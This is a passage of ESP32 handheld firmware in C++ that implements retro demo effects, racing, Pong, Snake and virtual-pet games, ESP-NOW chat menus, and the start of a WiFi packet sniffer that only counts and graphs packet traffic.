       stars[i].z = 255;
    }

    int x = (stars[i].x * 128) / stars[i].z + cx;
    int y = (stars[i].y * 128) / stars[i].z + cy;

    if (x >= 0 && x < SCREEN_WIDTH && y >= 0 && y < SCREEN_HEIGHT) {
      int size = (255 - stars[i].z) / 64;
      uint16_t color = (stars[i].z > 200) ? COLOR_DIM : COLOR_PRIMARY;
      if (size > 1) canvas.fillRect(x, y, size, size, color);
      else canvas.drawPixel(x, y, color);
    }
  }

  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, 10);
  canvas.print("UP/DN=Speed | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawGameOfLife() {
  if (!lifeInit) {
    for(int x=0; x<LIFE_W; x++) {
       for(int y=0; y<LIFE_H; y++) {
          lifeGrid[x][y] = random(0, 2);
       }
    }
    lifeInit = true;
  }

  if (millis() - lastLifeUpdate > 100) {
    // Logic
    for(int x=0; x<LIFE_W; x++) {
      for(int y=0; y<LIFE_H; y++) {
        int neighbors = 0;
        for(int i=-1; i<=1; i++) {
          for(int j=-1; j<=1; j++) {
            if(i==0 && j==0) continue;
            int nx = (x + i + LIFE_W) % LIFE_W;
            int ny = (y + j + LIFE_H) % LIFE_H;
            if(lifeGrid[nx][ny]) neighbors++;
          }
        }
        if(lifeGrid[x][y]) {
           nextGrid[x][y] = (neighbors == 2 || neighbors == 3) ? 1 : 0;
        } else {
           nextGrid[x][y] = (neighbors == 3) ? 1 : 0;
        }
      }
    }
    // Swap
    memcpy(lifeGrid, nextGrid, sizeof(lifeGrid));
    lastLifeUpdate = millis();

    // Auto reset check (crude)
    if(random(0, 500) == 0) lifeInit = false;
  }

  canvas.fillScreen(COLOR_BG);
  for(int x=0; x<LIFE_W; x++) {
    for(int y=0; y<LIFE_H; y++) {
      if(lifeGrid[x][y]) {
        canvas.fillRect(x*LIFE_SCALE, y*LIFE_SCALE, LIFE_SCALE-1, LIFE_SCALE-1, 0x07E0); // Green
      }
    }
  }

  if (digitalRead(BTN_SELECT) == BTN_ACT) lifeInit = false; // Manual reset

  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, 10);
  canvas.print("SEL=Reset | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawFireEffect() {
  if (!fireInit) {
    // Generate palette (Black->Red->Yellow->White)
    for(int i=0; i<37; i++) {
       // Simple gradient approx
       uint8_t r = min(255, i * 20);
       uint8_t g = (i > 12) ? min(255, (i-12) * 20) : 0;
       uint8_t b = (i > 24) ? min(255, (i-24) * 40) : 0;
       firePalette[i] = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
    }
    memset(firePixels, 0, sizeof(firePixels));
    fireInit = true;
  }

  // Seed bottom row
  for(int x=0; x<FIRE_W; x++) {
     firePixels[(FIRE_H-1)*FIRE_W + x] = random(0, 37); // Max heat
  }

  // Propagate
  for(int x=0; x<FIRE_W; x++) {
     for(int y=1; y<FIRE_H; y++) {
        int src = y * FIRE_W + x;
        int pixel = firePixels[src];
        if (pixel == 0) {
           firePixels[(y-1)*FIRE_W + x] = 0;
        } else {
           int randIdx = random(0, 3);
           int dst = (y-1)*FIRE_W + (x - randIdx + 1);
           if(dst >= 0 && dst < FIRE_W*FIRE_H) {
              firePixels[dst] = max(0, pixel - (randIdx & 1));
           }
        }
     }
  }

  canvas.fillScreen(COLOR_BG);
  int scaleX = SCREEN_WIDTH / FIRE_W;
  int scaleY = SCREEN_HEIGHT / FIRE_H;

  for(int y=0; y<FIRE_H; y++) {
    for(int x=0; x<FIRE_W; x++) {
       int colorIdx = firePixels[y*FIRE_W + x];
       if(colorIdx > 0) {
          if(colorIdx > 36) colorIdx = 36;
          canvas.fillRect(x*scaleX, y*scaleY, scaleX, scaleY, firePalette[colorIdx]);
       }
    }
  }

  canvas.setTextColor(COLOR_TEXT);
  canvas.setCursor(10, 10);
  canvas.print("DOOM FIRE | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ RACING GAME V2 LOGIC & DRAWING ============
void updateRacingLogic() {
    if (!racingGameActive) {
        // Reset player and AI cars
        playerCar = {0, 0, 0, 0, 0, 0};
        aiCar = {0.5, 0, 10, 80, 0, 0}; // Start AI with some speed
        opponentCar = {0, 0, 0, 0, 0, 0};
        opponentPresent = false;

        // Generate track
        roadPoints = MAX_ROAD_POINTS;
        float currentCurvature = 0;
        for(int i=0; i<MAX_ROAD_POINTS; i++) {
            roadCurvature[i] = sin(i * 0.05f) * 2.0f; // Example: sine wave track
            roadHeight[i] = sin(i * 0.1f) * 300.0f; // Example: sine wave hills
        }

        racingGameActive = true;
    }

    float dt = (millis() - lastRaceUpdate) / 1000.0f;
    if (dt > 0.1f) dt = 0.1f;
    lastRaceUpdate = millis();

    // --- Player Input ---
    if (digitalRead(BTN_UP) == BTN_ACT) playerCar.speed += 80.0f * dt;
    else playerCar.speed -= 40.0f * dt;
    if (digitalRead(BTN_DOWN) == BTN_ACT) playerCar.speed -= 100.0f * dt;

    if (digitalRead(BTN_LEFT) == BTN_ACT) playerCar.x -= 2.0f * dt * (playerCar.speed / 150.0f);
    if (digitalRead(BTN_RIGHT) == BTN_ACT) playerCar.x += 2.0f * dt * (playerCar.speed / 150.0f);

    playerCar.speed = constrain(playerCar.speed, 0, 200);
    playerCar.x = constrain(playerCar.x, -2, 2);

    // --- Physics ---
    int playerSegment = (int)(playerCar.z / 100.0f) % roadPoints;
    float speedPercent = playerCar.speed / 200.0f;
    playerCar.steerAngle = roadCurvature[playerSegment] * (1.0f - speedPercent);
    playerCar.x -= playerCar.steerAngle * speedPercent * dt * 2.0f;

    // Hills effect
    float heightDiff = roadHeight[(playerSegment + 5) % roadPoints] - roadHeight[playerSegment];
    playerCar.speed -= (heightDiff / 100.0f) * dt * 200.0f;

    // Off-road penalty
    if (abs(playerCar.x) > 1.0f) {
        playerCar.speed *= (1.0f - (abs(playerCar.x) - 1.0f) * 0.5f * dt);
    }

    playerCar.z += playerCar.speed * dt * 2.0f;
    if (playerCar.z >= roadPoints * 100.0f) playerCar.z -= roadPoints * 100.0f;

    // --- AI Logic ---
    int aiSegment = (int)(aiCar.z / 100.0f) % roadPoints;
    float targetX = roadCurvature[aiSegment] * -0.5f; // AI tries to stay in the middle
    aiCar.x += (targetX - aiCar.x) * 0.1f;
    aiCar.z += aiCar.speed * dt * 2.0f;
    if (aiCar.z >= roadPoints * 100.0f) aiCar.z -= roadPoints * 100.0f;

    // --- Multiplayer ---
    if (raceGameMode == RACE_MODE_MULTI) {
        outgoingMsg.type = 'R';
        outgoingMsg.raceData = {playerCar.x, playerCar.y, playerCar.z, playerCar.speed};
        esp_now_send(broadcastAddress, (uint8_t *)&outgoingMsg, sizeof(outgoingMsg));

        if (millis() - lastOpponentUpdate > 2000) opponentPresent = false;
    }

    // --- Camera ---
    camera.x = -playerCar.x * 2000.0f;
    camera.z = playerCar.z;
    camera.y = 500 + roadHeight[playerSegment];
}

void drawRacingGame() {
    canvas.fillScreen(0x4A49); // Sky Blue

    // --- Draw Parallax Background (Mountains) ---
    for(int i=0; i<SCREEN_WIDTH; i++) {
        float mountainHeight = sin((i * 0.1f + camera.z * 0.001f)) * 20 + sin(i * 0.05f + camera.z * 0.002f) * 10;
        canvas.drawFastVLine(i, SCREEN_HEIGHT/2 - mountainHeight, 100, 0x3A2E);
    }

    // --- Draw Road ---
    float camX = camera.x, camY = camera.y, camZ = camera.z;
    for (int n = 0; n < SCREEN_HEIGHT / 2; n++) {
        int y = n + SCREEN_HEIGHT / 2;
        int segmentIndex = ((int)((camZ + n*20) / 100.0f)) % roadPoints;
        float segmentPercent = fmod((camZ + n*20) / 100.0f, 1.0f);

        float currentCurvature = custom_lerp(roadCurvature[segmentIndex], roadCurvature[(segmentIndex + 1) % roadPoints], segmentPercent);
        float currentHeight = custom_lerp(roadHeight[segmentIndex], roadHeight[(segmentIndex+1)%roadPoints], segmentPercent);

        float roadX = 0;
        for (int i = 0; i < n; i++) {
            int prevSeg = ((int)((camZ + i*20) / 100.0f)) % roadPoints;
            roadX += roadCurvature[prevSeg] * (20.0f / 100.0f);
        }

        float perspective = (float)n / (SCREEN_HEIGHT / 2.0f);
        float roadWidth = 30 + perspective * 800;

        float screenX = SCREEN_WIDTH/2 + (roadX - camX) * 200.0f / (n*20 + 1) ;
        float screenY = y;

        uint16_t grassColor = (segmentIndex % 20 > 10) ? 0x04E0 : 0x0540;
        canvas.drawFastHLine(0, y, SCREEN_WIDTH, grassColor);

        // Road
        canvas.fillRect(screenX - roadWidth/2, y, roadWidth, 1, COLOR_SECONDARY);

        // Rumble Strips
        if ((segmentIndex % 20) < 2) {
            canvas.fillRect(screenX - roadWidth/2 - roadWidth*0.05, y, roadWidth*0.05, 1, 0xF800);
            canvas.fillRect(screenX + roadWidth/2, y, roadWidth*0.05, 1, 0xF800);
        }
    }

    // --- Draw Scenery (Trees) ---
    for(int i=10; i<100; i+=5) {
        int segment = ((int)(camera.z / 100.0f) + i) % roadPoints;
        float dz = (segment * 100.0f) - camera.z;
        if (dz < 100) continue;

        float objX = -2.5f; // Tree on the left
        float worldX = objX * 2000.0f;

        float scale = 500.0f / dz;
        float screenX = SCREEN_WIDTH/2 + scale * (worldX - camera.x);
        float screenY = SCREEN_HEIGHT/2 + scale * (roadHeight[segment] - camera.y) + SCREEN_HEIGHT/2;

        if (screenX > 0 && screenX < SCREEN_WIDTH) {
            drawScaledBitmap(screenX - 8*scale, screenY - 16*scale, sprite_tree, 16, 16, scale, 0xFFFF);
        }
    }

    // --- Draw Cars ---
    // Player Car
    drawScaledBitmap(SCREEN_WIDTH/2 - 32, SCREEN_HEIGHT - 64, sprite_car_player, 16, 16, 4.0, 0xFFFF);

    // AI Car
    float dx_ai = aiCar.x * 2000.0f - camera.x;
    float dz_ai = aiCar.z - camera.z;
    if (dz_ai > 100) {
        float scale = 500.0f / dz_ai;
        float screenX = SCREEN_WIDTH/2 + scale * dx_ai;
        float screenY = SCREEN_HEIGHT/2 + scale * (roadHeight[(int)(aiCar.z/100)%roadPoints] - camera.y) + SCREEN_HEIGHT/2;
        drawScaledBitmap(screenX - 8*scale, screenY - 16*scale, sprite_car_opponent, 16, 16, scale, 0xFFFF);
    }
    // Opponent Car
    if (opponentPresent) {
        float dx_op = opponentCar.x * 2000.0f - camera.x;
        float dz_op = opponentCar.z - camera.z;
        if (dz_op > 100) {
            float scale = 500.0f / dz_op;
            float screenX = SCREEN_WIDTH/2 + scale * dx_op;
            float screenY = SCREEN_HEIGHT/2 + scale * (roadHeight[(int)(opponentCar.z/100)%roadPoints] - camera.y) + SCREEN_HEIGHT/2;
            drawScaledBitmap(screenX - 8*scale, screenY - 16*scale, sprite_car_opponent, 16, 16, scale, 0xFFFF);
        }
    }

    // --- Draw HUD ---
    canvas.fillRoundRect(5, 5, 100, 30, 5, COLOR_PANEL);
    canvas.drawRoundRect(5, 5, 100, 30, 5, COLOR_BORDER);
    canvas.setTextColor(COLOR_PRIMARY);
    canvas.setTextSize(2);
    canvas.setCursor(15, 12);
    canvas.print((int)playerCar.speed);
    canvas.setTextSize(1);
    canvas.print(" KM/H");

    tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void triggerPongParticles(float x, float y) {
  for (int i = 0; i < MAX_PONG_PARTICLES; i++) {
    if (pongParticles[i].life <= 0) {
      pongParticles[i].x = x;
      pongParticles[i].y = y;
      pongParticles[i].vx = random(-100, 100) / 50.0f;
      pongParticles[i].vy = random(-100, 100) / 50.0f;
      pongParticles[i].life = 20; // Lifetime in frames
      return; // Spawn one particle per collision
    }
  }
}

void updateAndDrawPongParticles() {
  for (int i = 0; i < MAX_PONG_PARTICLES; i++) {
    if (pongParticles[i].life > 0) {
      pongParticles[i].x += pongParticles[i].vx;
      pongParticles[i].y += pongParticles[i].vy;
      pongParticles[i].life--;

      int size = (pongParticles[i].life > 10) ? 2 : 1;
      canvas.fillRect(pongParticles[i].x, pongParticles[i].y, size, size, COLOR_PRIMARY);
    }
  }
}

// ============ PONG GAME LOGIC & DRAWING ============
void resetPongBall() {
  pongBall.x = SCREEN_WIDTH / 2;
  pongBall.y = SCREEN_HEIGHT / 2;
  // Give it a random horizontal direction
  pongBall.vx = (random(0, 2) == 0 ? 1 : -1) * 150.0f;
  // Give it a slight random vertical direction
  pongBall.vy = random(-50, 50);
}

void updatePongLogic() {
  if (!pongGameActive) {
    player1.score = 0;
    player2.score = 0;
    player1.y = SCREEN_HEIGHT / 2 - 20;
    player2.y = SCREEN_HEIGHT / 2 - 20;
    resetPongBall();
    pongGameActive = true;
    // Clear particles
    for(int i=0; i<MAX_PONG_PARTICLES; i++) pongParticles[i].life = 0;
    return;
  }

  float dt = deltaTime; // Use global deltaTime

  // Ball movement
  pongBall.x += pongBall.vx * dt;
  pongBall.y += pongBall.vy * dt;

  // Wall collision (top/bottom)
  if (pongBall.y < 0) {
    pongBall.y = 0;
    pongBall.vy *= -1;
    triggerPongParticles(pongBall.x, pongBall.y);
  }
  if (pongBall.y > SCREEN_HEIGHT - 10) {
    pongBall.y = SCREEN_HEIGHT - 10;
    pongBall.vy *= -1;
    triggerPongParticles(pongBall.x, pongBall.y);
  }

  // Paddle collision
  #define PADDLE_WIDTH 10
  #define PADDLE_HEIGHT 40
  // Player 1
  if (pongBall.vx < 0 && pongBall.x < PADDLE_WIDTH + 5 && pongBall.x > 5) {
    if (pongBall.y > player1.y && pongBall.y < player1.y + PADDLE_HEIGHT) {
      pongBall.x = PADDLE_WIDTH + 5;
      pongBall.vx *= -1.1; // Speed up
      // Add spin based on where it hit the paddle
      pongBall.vy += (pongBall.y - (player1.y + PADDLE_HEIGHT / 2)) * 5.0f;
      triggerPongParticles(pongBall.x, pongBall.y);
    }
  }
  // Player 2 (AI)
  if (pongBall.vx > 0 && pongBall.x > SCREEN_WIDTH - PADDLE_WIDTH - 5 && pongBall.x < SCREEN_WIDTH - 5) {
    if (pongBall.y > player2.y && pongBall.y < player2.y + PADDLE_HEIGHT) {
      pongBall.x = SCREEN_WIDTH - PADDLE_WIDTH - 5;
      pongBall.vx *= -1.1; // Speed up
      pongBall.vy += (pongBall.y - (player2.y + PADDLE_HEIGHT / 2)) * 5.0f;
      triggerPongParticles(pongBall.x, pongBall.y);
    }
  }

  // Clamp ball speed
  pongBall.vx = constrain(pongBall.vx, -400, 400);
  pongBall.vy = constrain(pongBall.vy, -300, 300);

  // Scoring
  if (pongBall.x < 0) {
    player2.score++;
    resetPongBall();
  }
  if (pongBall.x > SCREEN_WIDTH) {
    player1.score++;
    resetPongBall();
  }

  // AI Logic - a bit slower and less perfect
  float aiSpeed = 2.8f * dt;
  float targetY = pongBall.y - PADDLE_HEIGHT / 2;
  // Add a small delay/lag to the AI's reaction
  player2.y += (targetY - player2.y) * aiSpeed * 0.8f;
  player2.y = max(0.0f, min((float)(SCREEN_HEIGHT - PADDLE_HEIGHT), player2.y));
}

void drawPongGame() {
  canvas.fillScreen(COLOR_BG);

  // Center line
  for (int i = 0; i < SCREEN_HEIGHT; i += 10) {
    canvas.drawFastVLine(SCREEN_WIDTH / 2, i, 5, COLOR_PANEL);
  }

  updateAndDrawPongParticles();

  // Scores
  canvas.setTextSize(3);
  canvas.setTextColor(COLOR_SECONDARY);
  canvas.setCursor(SCREEN_WIDTH / 2 - 50, 10);
  canvas.print(player1.score);
  canvas.setCursor(SCREEN_WIDTH / 2 + 30, 10);
  canvas.print(player2.score);

  // Paddles
  canvas.fillRect(5, player1.y, PADDLE_WIDTH, PADDLE_HEIGHT, COLOR_PRIMARY);
  canvas.fillRect(SCREEN_WIDTH - PADDLE_WIDTH - 5, player2.y, PADDLE_WIDTH, PADDLE_HEIGHT, COLOR_PRIMARY);

  // Ball
  canvas.fillRect(pongBall.x, pongBall.y, 10, 10, COLOR_PRIMARY);

  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ SNAKE GAME LOGIC ============
void initSnakeGame() {
  snakeLength = 3;
  snakeBody[0] = {SNAKE_GRID_WIDTH / 2, SNAKE_GRID_HEIGHT / 2};
  snakeBody[1] = {SNAKE_GRID_WIDTH / 2 - 1, SNAKE_GRID_HEIGHT / 2};
  snakeBody[2] = {SNAKE_GRID_WIDTH / 2 - 2, SNAKE_GRID_HEIGHT / 2};
  snakeDir = SNAKE_RIGHT;
  snakeGameOver = false;
  snakeScore = 0;

  // Place food
  food.x = random(0, SNAKE_GRID_WIDTH);
  food.y = random(0, SNAKE_GRID_HEIGHT);

  lastSnakeUpdate = 0;
}

void updateSnakeLogic() {
  if (snakeGameOver) {
    if (digitalRead(BTN_SELECT) == BTN_ACT) {
      initSnakeGame();
    }
    return;
  }

  if (millis() - lastSnakeUpdate < 100) { // Game speed
    return;
  }
  lastSnakeUpdate = millis();

  // Move body
  for (int i = snakeLength - 1; i > 0; i--) {
    snakeBody[i] = snakeBody[i - 1];
  }

  // Move head
  if (snakeDir == SNAKE_UP) snakeBody[0].y--;
  if (snakeDir == SNAKE_DOWN) snakeBody[0].y++;
  if (snakeDir == SNAKE_LEFT) snakeBody[0].x--;
  if (snakeDir == SNAKE_RIGHT) snakeBody[0].x++;

  // Wall collision
  if (snakeBody[0].x < 0 || snakeBody[0].x >= SNAKE_GRID_WIDTH ||
      snakeBody[0].y < 0 || snakeBody[0].y >= SNAKE_GRID_HEIGHT) {
    snakeGameOver = true;
  }

  // Self collision
  for (int i = 1; i < snakeLength; i++) {
    if (snakeBody[0].x == snakeBody[i].x && snakeBody[0].y == snakeBody[i].y) {
      snakeGameOver = true;
    }
  }

  // Food collision
  if (snakeBody[0].x == food.x && snakeBody[0].y == food.y) {
    snakeScore += 10;
    if (snakeLength < MAX_SNAKE_LENGTH) {
      snakeLength++;
    }
    // New food
    food.x = random(0, SNAKE_GRID_WIDTH);
    food.y = random(0, SNAKE_GRID_HEIGHT);
  }
}


// ============ VIRTUAL PET LOGIC & DRAWING ============
void loadPetData() {
  preferences.begin("pet-data", true);
  myPet.hunger = preferences.getFloat("hunger", 80.0f);
  myPet.happiness = preferences.getFloat("happy", 80.0f);
  myPet.energy = preferences.getFloat("energy", 80.0f);
  myPet.isSleeping = preferences.getBool("sleep", false);
  preferences.end();
}

void savePetData() {
  preferences.begin("pet-data", false);
  preferences.putFloat("hunger", myPet.hunger);
  preferences.putFloat("happy", myPet.happiness);
  preferences.putFloat("energy", myPet.energy);
  preferences.putBool("sleep", myPet.isSleeping);
  preferences.end();
}

void updatePetLogic() {
  unsigned long now = millis();
  if (now - myPet.lastUpdate >= 5000) { // Update every 5 seconds
    float decay = 0.5f; // Base decay

    if (myPet.isSleeping) {
      myPet.energy += 2.0f; // Recover energy
      myPet.hunger -= 0.8f; // Get hungry slower
    } else {
      myPet.energy -= 0.5f;
      myPet.hunger -= 1.0f;
      myPet.happiness -= 0.5f;
    }

    // Clamp values
    myPet.energy = constrain(myPet.energy, 0.0f, 100.0f);
    myPet.hunger = constrain(myPet.hunger, 0.0f, 100.0f);
    myPet.happiness = constrain(myPet.happiness, 0.0f, 100.0f);

    // Auto wake up if full energy
    if (myPet.isSleeping && myPet.energy >= 100.0f) {
      myPet.isSleeping = false;
      showStatus("Pet Woke Up!", 1000);
    }

    myPet.lastUpdate = now;
    if (now % 30000 < 5000) savePetData(); // Auto save occasionally
  }
}

void drawPetFace(int x, int y) {
  uint16_t faceColor = COLOR_PRIMARY;

  // Mood check
  if (myPet.hunger < 30 || myPet.happiness < 30) faceColor = COLOR_WARN;
  if (myPet.hunger < 10 || myPet.energy < 10) faceColor = COLOR_ERROR;

  // Body (Circle)
  canvas.drawCircle(x, y, 30, faceColor);
  canvas.drawCircle(x, y, 29, faceColor);

  if (myPet.isSleeping) {
    // Sleeping Eyes (Lines)
    canvas.drawLine(x - 15, y - 5, x - 5, y - 5, faceColor);
    canvas.drawLine(x + 5, y - 5, x + 15, y - 5, faceColor);
    // Zzz
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_DIM);
    canvas.setCursor(x + 25, y - 20); canvas.print("Z");
    canvas.setCursor(x + 32, y - 28); canvas.print("z");
  } else {
    // Eyes
    if (myPet.happiness > 70) {
      // Happy eyes (Arcs or filled circles)
      canvas.fillCircle(x - 12, y - 8, 4, faceColor);
      canvas.fillCircle(x + 12, y - 8, 4, faceColor);
    } else if (myPet.happiness < 30) {
      // Sad eyes (X)
      canvas.drawLine(x - 15, y - 10, x - 9, y - 4, faceColor);
      canvas.drawLine(x - 15, y - 4, x - 9, y - 10, faceColor);
      canvas.drawLine(x + 9, y - 10, x + 15, y - 4, faceColor);
      canvas.drawLine(x + 9, y - 4, x + 15, y - 10, faceColor);
    } else {
      // Normal eyes
      canvas.drawCircle(x - 12, y - 8, 4, faceColor);
      canvas.drawCircle(x + 12, y - 8, 4, faceColor);
    }

    // Mouth
    if (myPet.hunger < 40) {
      // Hungry/Sad mouth
      // GFX doesn't strictly have Arc, so use lines
      canvas.drawLine(x - 8, y + 20, x, y + 15, faceColor);
      canvas.drawLine(x, y + 15, x + 8, y + 20, faceColor);
    } else {
      // Happy mouth (V shape or U shape)
      canvas.drawLine(x - 8, y + 12, x, y + 18, faceColor);
      canvas.drawLine(x, y + 18, x + 8, y + 12, faceColor);
    }
  }
}

void drawPetGame() {
  updatePetLogic();

  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header Stats
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_DIM);

  // Hunger Bar
  canvas.setCursor(10, 20); canvas.print("HGR");
  canvas.drawRect(35, 20, 50, 6, COLOR_BORDER);
  canvas.fillRect(35, 20, (int)(myPet.hunger / 2), 6, myPet.hunger < 30 ? COLOR_ERROR : COLOR_SUCCESS);

  // Happiness Bar
  canvas.setCursor(100, 20); canvas.print("HAP");
  canvas.drawRect(125, 20, 50, 6, COLOR_BORDER);
  canvas.fillRect(125, 20, (int)(myPet.happiness / 2), 6, myPet.happiness < 30 ? COLOR_WARN : COLOR_ACCENT);

  // Energy Bar
  canvas.setCursor(190, 20); canvas.print("ENG");
  canvas.drawRect(215, 20, 50, 6, COLOR_BORDER);
  canvas.fillRect(215, 20, (int)(myPet.energy / 2), 6, myPet.energy < 30 ? COLOR_ERROR : COLOR_PRIMARY);

  // Draw Pet in Center
  drawPetFace(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2 - 10);

  // Menu at Bottom
  const char* items[] = {"Feed", "Play", "Meet", "Sleep", "Back"};
  int menuY = SCREEN_HEIGHT - 30;
  int itemW = SCREEN_WIDTH / 5;

  for (int i = 0; i < 5; i++) {
    int x = i * itemW;
    if (i == petMenuSelection) {
      canvas.fillRect(x + 2, menuY, itemW - 4, 25, COLOR_PRIMARY);
      canvas.setTextColor(COLOR_BG);
    } else {
      canvas.drawRect(x + 2, menuY, itemW - 4, 25, COLOR_BORDER);
      canvas.setTextColor(COLOR_TEXT);
    }

    canvas.setTextSize(1);
    // Center text
    int txtW = strlen(items[i]) * 6;
    canvas.setCursor(x + (itemW - txtW) / 2, menuY + 8);
    canvas.print(items[i]);
  }

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawESPNowMenu() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_espnow, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("ESP-NOW");

  // Status Panel
  canvas.fillRoundRect(10, 35, SCREEN_WIDTH - 20, 30, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, 35, SCREEN_WIDTH - 20, 30, 8, COLOR_BORDER);
  canvas.setTextSize(1);
  canvas.setCursor(22, 48);
  canvas.setTextColor(espnowInitialized ? COLOR_SUCCESS : COLOR_WARN);
  canvas.print(espnowInitialized ? "INITIALIZED" : "INACTIVE");

  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(140, 48);
  canvas.print("Peers: ");
  canvas.print(espnowPeerCount);
  canvas.print(" | Msgs: ");
  canvas.print(espnowMessageCount);

  // Menu Items
  const char* menuItems[] = {"Open Chat", "View Peers", "Set Nickname", "Add Peer (MAC)", "Chat Theme", "Back"};
  int numItems = 6;
  int itemHeight = 22;
  int startY = 75;
  int visibleItems = 4;
  int menuScroll = 0;

  if (menuSelection >= visibleItems) {
      menuScroll = (menuSelection - visibleItems + 1) * (itemHeight + 3);
  }

  for (int i = 0; i < numItems; i++) {
    int y = startY + (i * (itemHeight + 3)) - menuScroll;

    if (y < startY - itemHeight || y > SCREEN_HEIGHT) continue;

    if (i == menuSelection) {
      canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, itemHeight, 8, COLOR_PRIMARY);
      canvas.setTextColor(COLOR_BG);
    } else {
      canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, itemHeight, 8, COLOR_BORDER);
      canvas.setTextColor(COLOR_PRIMARY);
    }
    canvas.setTextSize(2);

    if (i == 4) { // Chat Theme
       String themeName = "Modern";
       if (chatTheme == 1) themeName = "Bubble";
       else if (chatTheme == 2) themeName = "Cyber";
       String themeText = "Theme: " + themeName;
       int textWidth = themeText.length() * 12;
       canvas.setCursor((SCREEN_WIDTH - textWidth) / 2, y + 4);
       canvas.print(themeText);
    } else {
       int textWidth = strlen(menuItems[i]) * 12;
       canvas.setCursor((SCREEN_WIDTH - textWidth) / 2, y + 4);
       canvas.print(menuItems[i]);
    }
  }
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawESPNowPeerList() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  canvas.drawFastHLine(0, 13, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(10, 2);
  canvas.print("PEERS (");
  canvas.print(espnowPeerCount);
  canvas.print(")");
  canvas.drawFastHLine(0, 25, SCREEN_WIDTH, COLOR_BORDER);
  
  if (espnowPeerCount == 0) {
    canvas.setTextColor(COLOR_TEXT);
    canvas.setTextSize(2);
    canvas.setCursor(80, 80);
    canvas.print("No peers");
  } else {
    int startY = 35;
    int itemHeight = 25;
    int visibleItems = 5;
    int scrollOffset = 0;

    if (selectedPeer >= visibleItems) {
        scrollOffset = (selectedPeer - visibleItems + 1);
    }
    
    for (int i = scrollOffset; i < min(espnowPeerCount, scrollOffset + visibleItems); i++) {
      int y = startY + ((i - scrollOffset) * itemHeight);
      
      if (i == selectedPeer) {
        canvas.fillRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_PRIMARY);
        canvas.setTextColor(COLOR_BG);
      } else {
        canvas.drawRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_BORDER);
        canvas.setTextColor(COLOR_TEXT);
      }
      
      canvas.setTextSize(1);
      canvas.setCursor(10, y + 5);
      canvas.print(espnowPeers[i].nickname);
      
      canvas.setCursor(10, y + 15);
      canvas.setTextColor(i == selectedPeer ? COLOR_BG : COLOR_DIM);
      char macStr[18];
      sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
              espnowPeers[i].mac[0], espnowPeers[i].mac[1], espnowPeers[i].mac[2],
              espnowPeers[i].mac[3], espnowPeers[i].mac[4], espnowPeers[i].mac[5]);
      canvas.print(macStr);
    }
  }
  
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("SELECT=Chat | LEFT=Rename | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ HACKER TOOLS: SNIFFER, NETSCAN, FILES ============
void drawSniffer() {
  if (!snifferActive) {
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuous);
    snifferActive = true;
    snifferPacketCount = 0;
    memset(snifferHistory, 0, sizeof(snifferHistory));
  }

  unsigned long now = millis();
  if (now - lastSnifferUpdate > 100) {
    snifferHistory[snifferHistoryIdx] = snifferPacketCount; // Store packets per 100ms
    snifferPacketCount = 0;
    snifferHistoryIdx = (snifferHistoryIdx + 1) % SNIFFER_HISTORY_LEN;
    lastSnifferUpdate = now;

    // Channel hopping
    int ch = (now / 500) % 13 + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }

  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Matrix Style Header
  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0x07E0);
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print("PACKET SNIFFER");

  // Draw Graph
  int graphBase = SCREEN_HEIGHT - 10;
  int maxVal = 1;
  for(int i=0; i<SNIFFER_HISTORY_LEN; i++) if(snifferHistory[i] > maxVal) maxVal = snifferHistory[i];

  for(int i=0; i<SNIFFER_HISTORY_LEN; i++) {
